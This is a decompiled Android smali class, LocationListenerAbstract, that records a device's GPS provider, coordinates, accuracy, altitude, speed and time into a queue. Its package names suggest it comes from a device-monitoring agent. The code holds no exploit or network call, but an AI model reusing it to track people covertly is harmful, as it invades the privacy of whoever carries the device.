.class public abstract Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;
.super Ljava/lang/Object;
.source "LocationListenerAbstract.java"

# interfaces
.implements Landroid/location/LocationListener;
.implements Lcom/hp/vd/module/monitor/location/LocationListenerInterface;


# static fields
.field protected static final TAG:Ljava/lang/String; = "LocationListenerAbstract"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/LocationData;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected providerMapper:Lcom/hp/vd/module/monitor/location/ProviderMapper;


# direct methods
.method public constructor <init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/module/monitor/location/ProviderMapper;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/LocationData;",
            ">;",
            "Lcom/hp/vd/module/monitor/location/ProviderMapper;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 24
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->providerMapper:Lcom/hp/vd/module/monitor/location/ProviderMapper;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 25
    iput-object p1, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 26
    iput-object p2, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->providerMapper:Lcom/hp/vd/module/monitor/location/ProviderMapper;

    .line 27
    iput-object p3, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public logRecord(Landroid/location/Location;)V
    .locals 3

    .line 32
    new-instance v0, Lcom/hp/vd/data/LocationData;

    invoke-direct {v0}, Lcom/hp/vd/data/LocationData;-><init>()V

    .line 34
    iget-object v1, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->providerMapper:Lcom/hp/vd/module/monitor/location/ProviderMapper;

    invoke-virtual {p1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/hp/vd/module/monitor/location/ProviderMapper;->map(Ljava/lang/String;)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/LocationData;->provider:Ljava/lang/Integer;

    .line 36
    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/LocationData;->latitude:Ljava/lang/Double;

    .line 37
    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/LocationData;->longitude:Ljava/lang/Double;

    .line 38
    invoke-virtual {p1}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    invoke-static {v1}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/LocationData;->accuracy:Ljava/lang/Float;

    .line 39
    invoke-virtual {p1}, Landroid/location/Location;->getAltitude()D

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/LocationData;->altitude:Ljava/lang/Double;

    .line 40
    invoke-virtual {p1}, Landroid/location/Location;->getSpeed()F

    move-result p1

    invoke-static {p1}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object p1

    iput-object p1, v0, Lcom/hp/vd/data/LocationData;->speed:Ljava/lang/Float;

    .line 42
    new-instance p1, Ljava/util/Date;

    invoke-direct {p1}, Ljava/util/Date;-><init>()V

    iput-object p1, v0, Lcom/hp/vd/data/LocationData;->takenAt:Ljava/util/Date;

    .line 44
    iget-object p1, p0, Lcom/hp/vd/module/monitor/location/LocationListenerAbstract;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {p1, v0}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0

    return-void
.end method
